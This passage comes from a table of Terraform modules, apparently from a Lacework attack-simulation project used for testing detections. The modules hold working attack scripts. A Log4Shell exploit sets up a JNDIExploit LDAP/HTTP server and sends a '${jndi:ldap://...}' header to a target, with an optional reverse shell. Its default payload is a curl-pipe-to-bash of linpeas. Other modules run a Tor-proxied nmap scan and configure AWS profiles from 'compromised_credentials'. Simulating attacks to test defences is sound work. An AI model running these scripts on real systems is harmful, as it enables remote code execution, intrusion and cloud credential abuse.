&quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;sshpass jq&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = var\.inputs\[&quot;attack\_delay&quot;\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| attacker-ssm-execute-docker-exploit-log4j                                  | ./modules/ssm/execute-docker-exploit-log4j                     | ssm_exec_docker_exploit_log4j_app          | context.aws.ssm.attacker.execute.docker_exploit_log4j_app                 | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_exploit_log4j_app": {<br/>                            "attack_delay": 50400,<br/>                            "attacker_http_port": 8088,<br/>                            "attacker_ip": null,<br/>                            "attacker_ldap_port": 1389,<br/>                            "enabled": false,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "reverse_shell": false,<br/>                            "reverse_shell_port": 0,<br/>                            "target_ip": null,<br/>                            "target_port": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-exploit-log4j                     | <pre>locals \{<br/>    attack\_dir = &quot;/jndiexploit&quot;<br/>    attack\_script = &quot;jndiexploit\.sh&quot;<br/>    start\_script = &quot;delayed\_start\.sh&quot;<br/>    lock\_file = &quot;/tmp/delay\_log4shell\.lock&quot;<br/>    jndiexploit\_url=&quot;https://github\.com/credibleforce/jndi/raw/main/jndi\.base64&quot;<br/>    image = &quot;openjdk:11&quot;<br/>    name = &quot;jndiexploit&quot;<br/>    exec\_type = var\.inputs\[&quot;reverse\_shell&quot;\] == true ? &quot;ReverseShell&quot; : &quot;Basic/Command/Base64&quot;<br/><br/>    \# only base64 encode the payload if we are executing a command<br/>    base64\_log4shell\_payload= urlencode\(var\.inputs\[&quot;reverse\_shell&quot;\] == true ? var\.inputs\[&quot;payload&quot;\] : base64encode\(<br/>       replace\(replace\(var\.inputs\[&quot;payload&quot;\], &quot;$ATTACKER\_IP&quot;, var\.inputs\[&quot;attacker\_ip&quot;\]\), &quot;$REVERSE\_SHELL\_PORT&quot;, var\.inputs\[&quot;reverse\_shell\_port&quot;\]\)<br/>    \)\)<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;removing previous app directory&quot;<br/>    docker stop $\{local\.name\}<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    log &quot;creating app directory&quot;<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    <br/>    log &quot;starting script\.\.\.&quot;<br/>    JNDIEXPLOIT\_URL=&quot;$\{local\.jndiexploit\_url\}&quot;<br/>    NAME=&quot;$\{local\.name\}&quot;<br/>    IMAGE=&quot;$\{local\.image\}&quot;<br/>    ATTACKER\_IP=&quot;$\{var\.inputs\[&quot;attacker\_ip&quot;\]\}&quot;<br/>    ATTACKER\_HTTP\_PORT=$\{var\.inputs\[&quot;attacker\_http\_port&quot;\]\}<br/>    ATTACKER\_LDAP\_PORT=$\{var\.inputs\[&quot;attacker\_ldap\_port&quot;\]\}<br/>    TARGET\_IP=$\{var\.inputs\[&quot;target\_ip&quot;\]\}<br/>    TARGET\_PORT=$\{var\.inputs\[&quot;target\_port&quot;\]\}<br/>    EXEC\_TYPE=&quot;$\{local\.exec\_type\}&quot;<br/>    REVERSE\_SHELL\_PORT=&quot;$\{var\.inputs\[&quot;reverse\_shell\_port&quot;\]\}&quot;<br/>    BASE64\_PAYLOAD=&quot;$\{local\.base64\_log4shell\_payload\}&quot;<br/>    PUBLIC\_IP=$\(curl \-s https://icanhazip\.com\)<br/>    TIMEOUT=1800<br/>    START\_TIME=$\(date \+%s\)<br/>    \# Check if $ATTACKER\_IP is an IP address<br/>    if \[\[ $ATTACKER\_IP =~ ^\[0\-9\]\+\\\.\[0\-9\]\+\\\.\[0\-9\]\+\\\.\[0\-9\]\+$ \]\]; then<br/>        log &quot;server is set to IP address $ATTACKER\_IP, no need to resolve DNS&quot;<br/>    else<br/>        log &quot;checking dns resolution: $ATTACKER\_IP&quot;<br/>        while true; do<br/>            IP=$\(dig \+short $ATTACKER\_IP\)<br/>            if \[ \-z &quot;$IP&quot; \]; then  \# If $IP is empty, the domain hasn&\#x27;t resolved yet<br/>                CURRENT\_TIME=$\(date \+%s\)<br/>                ELAPSED\_TIME=$\(\(CURRENT\_TIME \- START\_TIME\)\)<br/>                if \[ $ELAPSED\_TIME \-gt $TIMEOUT \]; then<br/>                    log &quot;DNS resolution for $ATTACKER\_IP timed out after $TIMEOUT seconds&quot;<br/>                    exit 1<br/>                fi<br/>                sleep 10<br/>            else<br/>                log &quot;Current public ip: $PUBLIC\_IP&quot;<br/>                log &quot;$ATTACKER\_IP resolved to $IP&quot;<br/>                if \[ &quot;$IP&quot; == &quot;$PUBLIC\_IP&quot; \]; then<br/>                    log &quot;Resolution matches public ip: $IP == $PUBLIC\_IP&quot;<br/>                    break<br/>                else<br/>                    log &quot;Resolution of dns does not match: $IP \!= $PUBLIC\_IP&quot;<br/>                    sleep 10<br/>                fi<br/>            fi<br/>        done<br/>    fi<br/><br/>    if \[\[ \! \-f &quot;jndi\.base64&quot; \|\| \! \-f &quot;JNDIExploit\-1\.2\-SNAPSHOT\.jar&quot; \]\]; then<br/>        rm \-f jndi\.base64 \*\.zip JNDIExploit\-\*\.jar<br/>        wget https://github\.com/credibleforce/jndi/raw/main/jndi\.base64<br/>        base64 \-d jndi\.base64 &gt; JNDIExploit\.1\.2\.zip<br/>        unzip \-o JNDIExploit\.\*\.zip<br/>        rm \*\.zip<br/>    fi<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;setting up jndiexploit in screen session\.\.\.&quot;<br/>        if pgrep \-f &quot;JNDIExploit&quot;; then<br/>            kill \-9 $\(pgrep \-f &quot;JNDIExploit&quot;\)<br/>        fi<br/>        JNDIEXPLOIT\_LOG=&quot;/tmp/jndiexploit\.log&quot;<br/>        for i in \`seq $\(\(MAXLOG\-1\)\) \-1 1\`; do mv &quot;$JNDIEXPLOIT\_LOG\.&quot;\{$i,$\(\(i\+1\)\)\} 2&gt;/dev/null \|\| true; done<br/>        mv $JNDIEXPLOIT\_LOG &quot;$JNDIEXPLOIT\_LOG\.1&quot; 2&gt;/dev/null \|\| true<br/>        screen \-S jndiexploit \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile $JNDIEXPLOIT\_LOG \-S jndiexploit \-m java \-jar JNDIExploit\-\*\.jar \-\-ip $ATTACKER\_IP \-\-httpPort 8088 \-\-ldapPort 1389<br/>        screen \-S jndiexploit \-X colon &quot;logfile flush 0^M&quot;<br/><br/>        log &quot;sleeping 15 minutes\.\.\.&quot;<br/>        sleep 900<br/>        log &quot;start services availability check\.\.\.&quot;<br/><br/>        log &quot;checking target: $TARGET\_IP:$TARGET\_PORT&quot;<br/>        while \! nc \-z \-w 5 \-vv $TARGET\_IP $TARGET\_PORT &gt; /dev/null; do<br/>            log &quot;failed check \- waiting for target: $TARGET\_IP:$TARGET\_PORT&quot;;<br/>            sleep 30;<br/>            if \! screen \-ls \| grep jndiexploit; then<br/>                log &quot;screen session no longer running\.\.\.reset required&quot;<br/>                break<br/>            fi<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if \! screen \-ls \| grep jndiexploit; then<br/>            log &quot;screen session no longer running\.\.\.reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;target available&quot;;<br/>        log &quot;checking attacker ldap: $ATTACKER\_IP:$ATTACKER\_LDAP\_PORT&quot;<br/>        while \! nc \-z \-w 5 \-vv $ATTACKER\_IP $ATTACKER\_LDAP\_PORT &gt; /dev/null; do<br/>            log &quot;failed check \- waiting for attacker ldap: $ATTACKER\_IP:$ATTACKER\_LDAP\_PORT&quot;;<br/>            sleep 30;<br/>            if \! screen \-ls \| grep jndiexploit; then<br/>                log &quot;screen session no longer running\.\.\.reset required&quot;<br/>                break<br/>            fi<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if \! screen \-ls \| grep jndiexploit; then<br/>            log &quot;screen session no longer running\.\.\.reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;attacker ldap available&quot;;<br/>        log &quot;checking attacker http: $ATTACKER\_IP:$ATTACKER\_HTTP\_PORT&quot;<br/>        while \! nc \-z \-w 5 \-vv $ATTACKER\_IP $ATTACKER\_HTTP\_PORT &gt; /dev/null; do<br/>            log &quot;failed check \- waiting for attacker http: $ATTACKER\_IP:$ATTACKER\_HTTP\_PORT&quot;;<br/>            sleep 30;<br/>            if \! screen \-ls \| grep jndiexploit; then<br/>                log &quot;screen session no longer running\.\.\.reset required&quot;<br/>                <br/>            fi<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if \! screen \-ls \| grep jndiexploit; then<br/>            log &quot;screen session no longer running\.\.\.reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;attacker http available&quot;;<br/>        if \[ &quot;0&quot; \!= &quot;$REVERSE\_SHELL\_PORT&quot; \]; then<br/>            log &quot;checking attacker reverse shell: $ATTACKER\_IP:$REVERSE\_SHELL\_PORT&quot;<br/>            while \! nc \-z \-w 5 \-vv $ATTACKER\_IP $REVERSE\_SHELL\_PORT &gt; /dev/null; do<br/>                log &quot;failed check \- waiting for attacker reverse shell: $ATTACKER\_IP:$REVERSE\_SHELL\_PORT&quot;;<br/>                sleep 30;<br/>                if \! screen \-ls \| grep jndiexploit; then<br/>                    log &quot;screen session no longer running\.\.\.reset required&quot;<br/>                fi<br/>                if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                    log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                    rm \-f /tmp/payload\_$SCRIPTNAME<br/>                    break 2<br/>                fi<br/>            done;<br/>            log &quot;attacker reverse shell available&quot;;<br/>        fi<br/>        sleep 30;<br/>        if \! screen \-ls \| grep jndiexploit; then<br/>            log &quot;screen session no longer running\.\.\.reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;sending payload: curl \-\-verbose $TARGET\_IP:$TARGET\_PORT \-H &\#x27;X\-Api\-Version: \\$$\{jndi:ldap://$ATTACKER\_IP:$ATTACKER\_LDAP\_PORT/$EXEC\_TYPE/$BASE64\_PAYLOAD\}&\#x27;&quot;<br/>        /bin/bash \-c &quot;curl \-\-verbose $TARGET\_IP:$TARGET\_PORT \-H &\#x27;X\-Api\-Version: \\$$\{jndi:ldap://$ATTACKER\_IP:$ATTACKER\_LDAP\_PORT/$EXEC\_TYPE/$BASE64\_PAYLOAD\}&\#x27;&quot;<br/>        log &quot;done&quot;;<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;waiting $\{var\.inputs\[&quot;attack\_delay&quot;\]\} seconds\.\.\.&quot;;<br/>            sleep $\{var\.inputs\[&quot;attack\_delay&quot;\]\}<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;git openjdk\-11\-jdk unzip&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;git java\-11\-openjdk java\-11\-openjdk\-devel unzip&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = var\.inputs\[&quot;attack\_delay&quot;\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| attacker-ssm-execute-docker-nmap                                           | ./modules/ssm/execute-docker-nmap                              | ssm_exec_docker_nmap_attacker              | context.aws.ssm.attacker.execute.docker_nmap                              | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_nmap": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "ports": [<br/>                                22,<br/>                                80,<br/>                                443,<br/>                                1433,<br/>                                3306,<br/>                                5000,<br/>                                5432,<br/>                                5900,<br/>                                6379,<br/>                                8000,<br/>                                8080,<br/>                                8088,<br/>                                8090,<br/>                                8091,<br/>                                9200,<br/>                                27017<br/>                            ],<br/>                            "scan_local_network": false,<br/>                            "targets": [],<br/>                            "use_tor": true<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-nmap                              | <pre>locals \{<br/>    attack\_dir = &quot;/nmap&quot;<br/>    attack\_script = &quot;nmap\.sh&quot;<br/>    start\_script = &quot;delayed\_start\.sh&quot;<br/>    lock\_file = &quot;/tmp/delay\_nmap\.lock&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting script\.\.\.&quot;<br/>        LOCAL\_NET=$\(ip \-o \-f inet addr show \| awk &\#x27;/scope global/ \{print $4\}&\#x27; \| head \-1\)<br/>        log &quot;LOCAL\_NET: $LOCAL\_NET&quot;<br/>        log &quot;Targets: $\{join\(&quot;,&quot;, var\.inputs\[&quot;targets&quot;\]\)\}&quot;<br/>        echo &quot;$\{ length\(var\.inputs\[&quot;targets&quot;\]\) &gt; 0 ? join\(&quot;\\n&quot;, var\.inputs\[&quot;targets&quot;\]\) : &quot;$LOCAL\_NET&quot; \}&quot; &gt; /tmp/nmap\-targets\.txt<br/>        log &quot;Ports: $\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\}&quot;<br/>        if docker ps \-a \| grep $\{var\.inputs\[&quot;container\_name&quot;\]\}; then <br/>            docker stop $\{var\.inputs\[&quot;container\_name&quot;\]\}<br/>            docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}<br/>        fi<br/>        $\{ var\.inputs\[&quot;use\_tor&quot;\] == true ? &lt;&lt;\-EOF<br/>        log &quot;Using tor network\.\.\.&quot;<br/>        if \! docker ps \| grep torproxy &gt; /dev/null; then<br/>        docker run \-d \-\-rm \-\-name torproxy \-p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$\(docker inspect \-f &\#x27;\{\{range \.NetworkSettings\.Networks\}\}\{\{\.IPAddress\}\}\{\{end\}\}&\#x27; torproxy\)<br/>        log &quot;Running via docker: proxychains nmap \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\} \-iL /tmp/nmap\-targets\.txt&quot;<br/>        /bin/bash \-c &quot;docker run \-v /tmp:/tmp \-e TORPROXY=$TORPROXY \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} nmap \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\} \-iL /tmp/nmap\-targets\.txt \|\| true&quot; <br/>        /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        EOF<br/>        : &lt;&lt;\-EOF<br/>        log &quot;Running via docker: nmap \-Pn \-sS \-T2 \-oX /tmp/scan\.xml \-p$\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\} \-iL /tmp/nmap\-targets\.txt&quot;<br/>        /bin/bash \-c &quot;docker run \-\-rm \-v /tmp:/tmp \-\-entrypoint=nmap \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\} \-iL /tmp/nmap\-targets\.txt \|\| true&quot;<br/>        /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        EOF<br/>        \}<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>            log &quot;waiting $\{var\.inputs\[&quot;attack\_delay&quot;\]\} seconds\.\.\.&quot;;<br/>            sleep $\{var\.inputs\[&quot;attack\_delay&quot;\]\}<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = var\.inputs\[&quot;attack\_delay&quot;\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| attacker-ssm-execute-generate-aws-cli-traffic-attacker                     | ./modules/ssm/execute-generate-aws-cli-traffic                 | ssm_exec_generate_aws_cli_traffic_attacker | context.aws.ssm.attacker.execute.generate_aws_cli_traffic                 | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "generate_aws_cli_traffic": {<br/>                            "commands": [<br/>                                "x=10",<br/>                                "opts=\"--output json --color off --no-cli-pager\"",<br/>                                "while [ $x -gt 0 ]; do ",<br/>                                "log \"Running: aws sts get-caller-identity $opts\"",<br/>                                "aws sts get-caller-identity $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws iam list-users $opts\"",<br/>                                "aws iam list-users $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws s3api list-buckets $opts\"",<br/>                                "aws s3api list-buckets $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-instances $opts\"",<br/>                                "aws ec2 describe-instances $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts\"",<br/>                                "aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-volumes $opts\"",<br/>                                "aws ec2 describe-volumes $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-vpcs $opts\"",<br/>                                "aws ec2 describe-vpcs $opts >> $LOGFILE 2>&1",<br/>                                "x=$(($x-1))",<br/>                                "done"<br/>                            ],<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "profile": "aws-traffic"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre> | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-aws-cli-traffic                 | <pre>locals \{<br/>    tool = &quot;aws&quot;<br/>    attack\_dir = &quot;/generate\-aws\-cli\-traffic&quot;<br/>    aws\_creds = join\(&quot;\\n&quot;, \[ for u,k in var\.inputs\[&quot;compromised\_credentials&quot;\]: &quot;echo &\#x27;$\{k\.rendered\}&\#x27; &gt; $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}&quot; \]\)<br/>    aws\_commands = join\(&quot;\\n&quot;, \[ for command in var\.inputs\[&quot;commands&quot;\]: &quot;$\{command\}&quot; \]\)<br/>    payload = &lt;&lt;\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    source \.env\-aws\-$\{var\.inputs\[&quot;compromised\_keys\_user&quot;\]\}<br/>    PROFILE=&quot;$\{var\.inputs\[&quot;profile&quot;\]\}&quot;<br/>    REGION=&quot;$\{var\.inputs\[&quot;region&quot;\]\}&quot;<br/>    aws configure set aws\_access\_key\_id $AWS\_ACCESS\_KEY\_ID \-\-profile=$PROFILE<br/>    aws configure set aws\_secret\_access\_key $AWS\_SECRET\_ACCESS\_KEY \-\-profile=$PROFILE<br/>    aws configure set region $REGION \-\-profile=$PROFILE<br/>    aws configure set output json \-\-profile=$PROFILE<br/>    log &quot;Running aws commands\.\.\.&quot;<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        $\{local\.aws\_commands\}<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &gt; /dev/null; do<br/>            log &quot;$\{local\.tool\} not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &gt; /dev/null; do<br/>            log &quot;$\{local\.tool\} not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  